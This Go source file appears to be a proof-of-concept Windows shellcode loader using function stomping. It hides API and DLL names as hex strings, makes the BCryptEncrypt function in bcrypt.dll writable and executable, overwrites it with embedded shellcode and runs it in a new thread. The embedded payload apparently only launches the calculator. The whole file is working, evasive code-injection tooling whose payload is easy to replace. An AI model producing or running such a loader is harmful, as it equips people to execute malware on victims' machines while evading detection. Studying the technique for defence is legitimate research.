package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"syscall"
	"unsafe"
)

var (
	kernel32       = syscall.NewLazyDLL(dehex("6b65726e656c33322e646c6c"))
	virtualProtect = kernel32.NewProc(dehex("5669727475616c50726f74656374"))
	createThread   = kernel32.NewProc(dehex("437265617465546872656164"))

	// Colores de texto ANSI
	colorRed    = "\033[31m"
	colorGreen  = "\033[32m"
	colorYellow = "\033[33m"
	colorReset  = "\033[0m"
)

func dehex(hexStr string) string {
	bytes, err := hex.DecodeString(hexStr)
	if err != nil {
		log.Fatal(err)
	}
	return string(bytes)
}
func main() {

	// Shellcode
	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}
	bcryptDllPath := dehex("433a5c57696e646f77735c53797374656d33325c6263727970742e646c6c")
	lib, err := syscall.LoadLibrary(bcryptDllPath)
	if err != nil {
		fmt.Println("Failed to load library:", err)
		return
	}
	fmt.Printf("Address of library bcrypt.dll : 0x%X\n", uintptr(lib))

	funcName := dehex("424372797074456e6372797074")
	funcAddress, err := syscall.GetProcAddress(lib, funcName)
	if err != nil {
		log.Fatal("Failed to get function address:", err)
	}
	fmt.Printf("Address of BCryptEncrypt function : 0x%X\n", funcAddress)

	var oldProtect uint32

	// Change memory protection before writing the shellcode
	ret, _, err := virtualProtect.Call(funcAddress, uintptr(len(shellcode)), syscall.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		fmt.Println(colorRed, "Failed to change memory protection:", err, colorReset)
		return
	}
	fmt.Println(colorGreen, "Memory protection changed successfully.", colorReset)
	fmt.Printf("Old protection: 0x%X\n", oldProtect)
	// Print the shellcode in a hexadecimal table format
	printShellcode(shellcode)

	// Write the shellcode to the BCryptEncrypt function
	copyMemory(funcAddress, shellcode)
	fmt.Println(colorGreen, "Shellcode written to BCryptEncrypt function successfully.", colorReset)

	// Adjust the protection back to the original state
	ret, _, err = virtualProtect.Call(funcAddress, uintptr(len(shellcode)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		fmt.Println(colorRed, "Failed to restore memory protection:", err, colorReset)
		return
	}
	fmt.Println(colorGreen, "Memory protection restored successfully.", colorReset)
	fmt.Printf("Restored protection: 0x%X\n", oldProtect)

	// Start a new thread
	threadHandle, _, err := createThread.Call(0, uintptr(len(shellcode)), funcAddress, 0, 0, 0)
	if threadHandle == 0 {
		fmt.Println(colorRed, "Failed to create thread:", err, colorReset)
		return
	}
	fmt.Println(colorGreen, "Thread created successfully.", colorReset)
	fmt.Printf("Thread handle: 0x%X\n", threadHandle)
	fmt.Println(colorYellow, "Inyect Success [+]", colorReset)
	fmt.Scanln()
}

func copyMemory(dest uintptr, src []byte) {
	for i, b := range src {
		*(*byte)(unsafe.Pointer(dest + uintptr(i))) = b
	}
}

func printShellcode(shellcode []byte) {
	fmt.Println("Shellcode:")
	for i := 0; i < len(shellcode); i += 16 {
		end := i + 16
		if end > len(shellcode) {
			end = len(shellcode)
		}
		offset := fmt.Sprintf("%08X", i)
		bytes := hex.EncodeToString(shellcode[i:end])
		fmt.Printf("%s  %s\n", offset, bytes)
	}
}
